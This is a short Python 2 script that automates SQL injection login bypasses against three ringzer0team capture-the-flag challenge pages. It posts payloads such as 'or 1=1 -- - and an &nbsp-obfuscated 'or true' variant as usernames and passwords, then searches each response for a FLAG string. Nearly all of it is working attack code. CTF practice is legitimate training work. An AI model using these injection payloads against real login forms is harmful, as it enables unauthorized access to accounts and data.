#!/bin/python2
# coding: utf-8
import requests
import re

class data_post:

    def __init__(self):

        #   R E G X : 
        self.regx=[
                "flag.*"]
        
        #   U S E R N A M E 
        self.username=["'or 1=1 -- -", 
                "'or true;",
                "a"
                ]

        #   P A S S W O R D 
        self.password=["",
                "",
                "'&nbspor&nbsptrue"

                ]

        #   U R L 
        self.url=["http://challenges.ringzer0team.com:20001/chal01.php",
                "http://challenges.ringzer0team.com:20002/chal02.php",
                "http://challenges.ringzer0team.com:20003/chal03.php"
                ]

class data_values:
    def __init__(self):

        # ' F O R M   V A L U E '   O F   T H E   H T M L.
        self.username='username' 
        self.password='password'


if __name__=='__main__':

    #init classes
    data_values=data_values()
    data_post=data_post()
    
    session = requests.Session()

    i=0
    for _url in data_post.url:
        next_url=False

        for _username, _password in zip(data_post.username, data_post.password):
            if next_url: 
                break    
            data={
                data_values.username: _username,
                data_values.password: _password
                    }
        
            login = session.post( _url, data=data)

            for _regx in data_post.regx:
                flag=re.search('FLAG.*', login.content)
                try:
                    print '\n[*]{}\n`-->: {}\n'.format(flag.group(0),_url)
                except Exception, e:
                    continue
                next_url = True

